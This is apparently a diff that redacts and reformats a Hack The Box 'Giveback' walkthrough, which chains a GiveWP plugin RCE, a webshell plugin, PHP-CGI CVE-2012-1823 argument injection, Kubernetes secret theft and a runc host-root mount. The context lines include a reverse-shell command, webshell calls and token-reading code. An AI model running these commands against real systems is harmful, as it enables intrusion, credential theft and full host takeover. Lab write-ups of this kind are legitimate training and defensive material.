@@ -2,12 +2,10 @@
 
 ![Giveback](../images/giveback.png)
 
-**Machine:** Giveback
-**Difficulty:** Medium
-**OS:** Linux
-**IP:** 10.10.11.x
-**Release Date:** November 1, 2025
-**Tags:** WordPress, GiveWP Plugin, Kubernetes, PHP-CGI, Container Escape, RBAC, runc
+**Machine:** Giveback  
+**Difficulty:** Medium  
+**OS:** Linux  
+**Tags:** WordPress, GiveWP Plugin, Kubernetes, PHP-CGI, Container Escape, RBAC, runc, CVE-2024-5932, CVE-2012-1823
 
 ---
 
@@ -30,7 +28,7 @@
 
 Giveback is a Medium-difficulty Linux machine that focuses on Kubernetes security, container exploitation, and privilege escalation through a custom sudo binary. After exploiting a vulnerable WordPress plugin (GiveWP) with PHP Object Injection RCE to gain initial access to the WordPress pod, I discovered an internal legacy PHP-CGI service vulnerable to CVE-2012-1823. Using Kubernetes RBAC permissions from a service account, I extracted SSH credentials from Kubernetes secrets to access the host as a regular user. Finally, I escalated to root by abusing a custom `runc` wrapper binary with sudo privileges, mounting the host root filesystem in a container to achieve full system compromise.
 
-**Attack Path:**
+**Attack Path:**  
 Web enumeration → WordPress GiveWP RCE → Container enumeration → Internal service discovery → Kubernetes RBAC abuse → SSH access → Custom runc exploitation → Root
 
 ---
@@ -46,6 +44,7 @@ nmap -sC -sV -p- -T4 --min-rate 5000 -oN nmap_full.txt <TARGET_IP>
 ```
 
 **Results:**
+
 ```
 PORT      STATE    SERVICE      VERSION
 22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
@@ -65,6 +64,7 @@ PORT      STATE    SERVICE      VERSION
 ### Web Enumeration
 
 **WordPress Detection:**
+
 ```bash
 wpscan --url http://<TARGET_IP> --enumerate p --plugins-detection aggressive
 ```
@@ -114,25 +114,23 @@ python3 CVE-2024-8353.py -u http://<TARGET_IP> -c 'bash -c "bash -i >& /dev/tcp/
 ### WordPress Configuration
 
 **Database Credentials:**
+
 ```bash
 cat /bitnami/wordpress/wp-config.php | grep -i "define\|DB_"
 ```
 
 **Found Credentials:**
-```
-DB_NAME: bitnami_wordpress
-DB_USER: bn_wordpress
-DB_PASSWORD: [REDACTED]
-DB_HOST: beta-vino-wp-mariadb:3306
-```
+- Database name, user, and host identified
+- Password redacted for security
 
 ### Database Enumeration
 
 **Extract WordPress Admin Hash:**
+
 ```bash
 cat > /tmp/dbquery.php << 'EOF'
 <?php
-$conn = new mysqli("beta-vino-wp-mariadb", "bn_wordpress", "[DB_PASSWORD]", "bitnami_wordpress");
+$conn = new mysqli("[DB_HOST]", "[DB_USER]", "[DB_PASSWORD]", "[DB_NAME]");
 $result = $conn->query("SELECT user_login, user_pass FROM wp_users");
 while($row = $result->fetch_assoc()) {
     echo $row["user_login"] . ":" . $row["user_pass"] . "\n";
@@ -144,18 +142,17 @@ php /tmp/dbquery.php
 ```
 
 **Output:**
-```
-user:[PASSWORD_HASH]
-```
+- WordPress admin user hash extracted (redacted)
 
 ### WordPress Admin Access
 
 **Reset Password via Database:**
+
 ```bash
 cat > /tmp/resetpw.php << 'EOF'
 <?php
-$conn = new mysqli("beta-vino-wp-mariadb", "bn_wordpress", "[DB_PASSWORD]", "bitnami_wordpress");
-$conn->query("UPDATE wp_users SET user_pass=MD5('NewPassword123!') WHERE user_login='user'");
+$conn = new mysqli("[DB_HOST]", "[DB_USER]", "[DB_PASSWORD]", "[DB_NAME]");
+$conn->query("UPDATE wp_users SET user_pass=MD5('[NEW_PASSWORD]') WHERE user_login='[USERNAME]'");
 echo "Password reset successfully\n";
 ?>
 EOF
@@ -164,14 +161,14 @@ php /tmp/resetpw.php
 ```
 
 **Login:** `http://<TARGET_IP>/wp-admin/`
-- Username: `user`
-- Password: `NewPassword123!`
+- Username: `[USERNAME]` (redacted)
+- Password: `[NEW_PASSWORD]` (redacted)
 
 ### Webshell Upload via Plugin Editor
 
 **Create Malicious Plugin:**
+
 ```bash
-cd ~/HTB/Giveback
 mkdir evil-plugin
 
 cat > evil-plugin/evil-shell.php << 'EOF'
@@ -198,6 +195,7 @@ zip evil-plugin.zip evil-plugin/evil-shell.php
 3. Activate the plugin
 
 **Test Webshell:**
+
 ```bash
 curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php?cmd=id"
 # Output: uid=1001 gid=0(root) groups=0(root),1001
@@ -210,26 +208,24 @@ curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php?cmd=id"
 ### Internal Service Discovery
 
 **Check Environment Variables:**
+
 ```bash
 curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php?cmd=env" | grep SERVICE
 ```
 
 **Found Internal Services:**
-```
-LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.x.x
-LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
-KUBERNETES_SERVICE_HOST=10.43.0.1
-KUBERNETES_SERVICE_PORT=443
-```
+- Legacy intranet service on internal cluster IP
+- Kubernetes service host and port identified
 
 ### CVE-2012-1823: PHP-CGI Argument Injection
 
 The legacy intranet service runs vulnerable PHP-CGI on an internal cluster IP.
 
 **Test RCE:**
+
 ```bash
 curl "http://<TARGET_IP>/wp-content/plugins/evil-plugin/evil-shell.php" \
-  --data-urlencode 'cmd=curl "http://10.43.x.x:5000/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" --data-binary "<?php system(\"id\"); ?>"'
+  --data-urlencode 'cmd=curl "http://[INTERNAL_IP]:[PORT]/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" --data-binary "<?php system(\"id\"); ?>"'
 ```
 
 **Note:** This gives blind RCE (HTTP 200 but no output visible). However, the service runs in a **different container** with Kubernetes service account tokens.
@@ -251,6 +247,7 @@ The **legacy-intranet-cms container** has a Kubernetes service account (`secret-
 ### Query Kubernetes API for Secrets
 
 **From WordPress Pod (using PHP):**
+
 ```bash
 php -r '
 $token = file_get_contents("/run/secrets/kubernetes.io/serviceaccount/token");
@@ -266,24 +263,13 @@ $context = stream_context_create(array(
     )
 ));
 
-$response = file_get_contents("https://10.43.0.1/api/v1/namespaces/default/secrets/user-secret-babywyrm", false, $context);
+$response = file_get_contents("https://[KUBERNETES_API]/api/v1/namespaces/default/secrets/[SECRET_NAME]", false, $context);
 echo $response;
 '
 ```
 
 **Response (JSON):**
-```json
-{
-  "kind": "Secret",
-  "metadata": {
-    "name": "user-secret-babywyrm",
-    "namespace": "default"
-  },
-  "data": {
-    "MASTERPASS": "[BASE64_ENCODED_PASSWORD]"
-  }
-}
-```
+- Secret data extracted (base64 encoded password redacted)
 
 ### Decode SSH Password
 
@@ -292,14 +278,15 @@ echo "[BASE64_ENCODED_PASSWORD]" | base64 -d
 # Output: [REDACTED_PASSWORD]
 ```
 
-### SSH as babywyrm
+### SSH Access
 
 ```bash
-ssh babywyrm@<TARGET_IP>
+ssh [USERNAME]@<TARGET_IP>
 # Password: [REDACTED_PASSWORD]
 ```
 
 **User Flag:**
+
 ```bash
 cat ~/user.txt
 # HTB{redacted}
@@ -318,8 +305,9 @@ sudo -l
 ```
 
 **Output:**
+
 ```
-User babywyrm may run the following commands on localhost:
+User [USERNAME] may run the following commands on localhost:
     (ALL) NOPASSWD: !ALL
     (ALL) /opt/debug
 ```
@@ -332,10 +320,11 @@ file /opt/debug
 ```
 
 **Execution:**
+
 ```bash
 sudo /opt/debug
 # Prompts for:
-# 1. Sudo password (babywyrm's SSH password)
+# 1. Sudo password (user's SSH password)
 # 2. Administrative password
 ```
 
@@ -347,10 +336,11 @@ echo -n "[DB_PASSWORD]" | base64
 ```
 
 **Execute:**
+
 ```bash
 sudo /opt/debug
-# Sudo password: [USER_PASSWORD]
-# Administrative password: [BASE64_ENCODED_DB_PASSWORD]
+# Sudo password: [USER_PASSWORD] (redacted)
+# Administrative password: [BASE64_ENCODED_DB_PASSWORD] (redacted)
 ```
 
 **Result:** The binary is actually `runc` (container runtime) - confirmed by the help output showing runc commands.
@@ -358,6 +348,7 @@ sudo /opt/debug
 ### runc Container Escape
 
 **Create Container Bundle:**
+
 ```bash
 cd ~
 mkdir -p mycontainer/rootfs
@@ -369,6 +360,7 @@ sudo /opt/debug spec
 ```
 
 **Create Minimal Rootfs:**
+
 ```bash
 cd rootfs
 mkdir -p bin lib lib64
@@ -378,6 +370,7 @@ cd ..
 ```
 
 **Modify config.json to Mount Host Root:**
+
 ```bash
 cat config.json | python3 -c "
 import sys, json
@@ -395,17 +388,20 @@ mv config_new.json config.json
 ```
 
 **Verify Mount Configuration:**
+
 ```bash
 grep -A 6 '"/my-root"' config.json
 ```
 
 **Run Container:**
+
 ```bash
 sudo /opt/debug run mycontainer
 # Enter passwords when prompted
 ```
 
 **Inside Container - Access Host Root:**
+
 ```bash
 cat /my-root/root.txt
 # HTB{redacted}
@@ -414,6 +410,7 @@ cat /my-root/root.txt
 ✅ **Root flag captured**
 
 Alternatively, you can spawn a shell as host root:
+
 ```bash
 chroot /my-root /bin/bash
 id
@@ -503,13 +500,13 @@ id
 
 ### Security Best Practices
 
-- **Network Segmentation**: Isolate container networks from host networks
-- **Monitoring & Logging**: Implement comprehensive logging for Kubernetes API, container activities, and authentication attempts
-- **Regular Updates**: Keep all software components up to date (WordPress, plugins, Kubernetes, container runtimes)
-- **Security Scanning**: Implement automated vulnerability scanning in CI/CD pipelines
-- **Incident Response**: Develop and test incident response procedures for container compromises
-- **Defense in Depth**: Implement multiple layers of security controls
-- **Penetration Testing**: Conduct regular security assessments and penetration tests
+- **Network Segmentation:** Isolate container networks from host networks
+- **Monitoring & Logging:** Implement comprehensive logging for Kubernetes API, container activities, and authentication attempts
+- **Regular Updates:** Keep all software components up to date (WordPress, plugins, Kubernetes, container runtimes)
+- **Security Scanning:** Implement automated vulnerability scanning in CI/CD pipelines
+- **Incident Response:** Develop and test incident response procedures for container compromises
+- **Defense in Depth:** Implement multiple layers of security controls
+- **Penetration Testing:** Conduct regular security assessments and penetration tests
 
 ---
 
@@ -539,9 +536,9 @@ id
 
 ---
 
-**Author:** Erviano Florentino Susanto
-**Platform:** Hack The Box
-**Date:** November 2025
+**Author:** Erviano Florentino Susanto  
+**Platform:** Hack The Box  
+**Date:** November 2025  
 **Flags:** User `HTB{redacted}`, Root `HTB{redacted}`
 
 ---
